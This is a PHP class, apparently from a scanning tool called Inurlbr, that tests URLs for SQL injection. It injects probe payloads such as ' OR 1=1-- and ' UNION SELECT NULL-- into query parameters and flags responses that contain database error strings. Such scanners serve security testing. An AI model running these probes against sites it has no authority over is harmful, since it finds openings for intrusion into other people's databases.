<?php

declare(strict_types=1);

namespace Inurlbr\Validators;

use Inurlbr\Contracts\ValidatorInterface;
use Inurlbr\Models\Vulnerability;
use GuzzleHttp\Client;
use GuzzleHttp\Exception\RequestException;
use Psr\Log\LoggerInterface;

/**
 * Validador de inyección SQL.
 * Detecta errores típicos de SQL en la respuesta.
 */
class SqlInjectionValidator implements ValidatorInterface
{
    private Client $client;
    private LoggerInterface $logger;
    
    private array $sqlErrors = [
        'SQL syntax',
        'MySQL result index',
        'ORA-009',
        'Oracle error',
        'PostgreSQL',
        'SQLite3::',
        'JDBC Driver',
        'ODBC',
        'Unclosed quotation mark',
        'syntax error',
        'unexpected T_STRING',
        'Warning: mysql_',
        'Warning: pg_',
        'Warning: sqlite_',
    ];

    public function __construct(Client $client, LoggerInterface $logger)
    {
        $this->client = $client;
        $this->logger = $logger;
    }

    public function validate(string $url): ?Vulnerability
    {
        // Payloads para detectar SQLi
        $payloads = [
            "'",
            "''",
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "1' AND '1'='1",
            "1 AND 1=1",
        ];

        foreach ($payloads as $payload) {
            $testUrl = $this->injectPayload($url, $payload);
            
            try {
                $response = $this->client->get($testUrl, [
                    'timeout' => 10,
                    'http_errors' => false,
                ]);

                $content = (string) $response->getBody();
                
                if ($this->detectSqlError($content)) {
                    $this->logger->info("SQLi detectada en: {$testUrl}");
                    
                    return new Vulnerability(
                        url: $testUrl,
                        type: 'SQL Injection',
                        severity: 'CRITICAL',
                        evidence: $this->extractEvidence($content),
                        payload: $payload,
                        confidence: 85
                    );
                }
            } catch (RequestException $e) {
                $this->logger->warning("Error al validar SQLi: " . $e->getMessage());
                continue;
            }
        }

        return null;
    }

    public function getType(): string
    {
        return 'SQL Injection';
    }

    /**
     * Inyecta un payload en la URL.
     */
    private function injectPayload(string $url, string $payload): string
    {
        // Si la URL ya tiene parámetros, agregar el payload
        if (strpos($url, '?') !== false) {
            // Intentar inyectar en cada parámetro
            parse_str(parse_url($url, PHP_URL_QUERY) ?? '', $params);
            
            foreach ($params as $key => $value) {
                if (is_numeric($value) || $value === '') {
                    // Reemplazar valor numérico o vacío con payload
                    return str_replace(
                        "{$key}={$value}",
                        "{$key}=" . urlencode($payload),
                        $url
                    );
                }
            }
            
            // Si no se encontró parámetro numérico, agregar al final
            return $url . '&' . urlencode($payload);
        }
        
        // Si no hay parámetros, agregar uno genérico
        return $url . '?id=' . urlencode($payload);
    }

    /**
     * Detecta errores de SQL en el contenido.
     */
    private function detectSqlError(string $content): bool
    {
        foreach ($this->sqlErrors as $error) {
            if (stripos($content, $error) !== false) {
                return true;
            }
        }
        
        return false;
    }

    /**
     * Extrae evidencia del error SQL.
     */
    private function extractEvidence(string $content): string
    {
        $lines = explode("\n", strip_tags($content));
        
        foreach ($lines as $line) {
            foreach ($this->sqlErrors as $error) {
                if (stripos($line, $error) !== false) {
                    return trim(substr($line, 0, 200));
                }
            }
        }
        
        return 'SQL error pattern detected';
    }
}
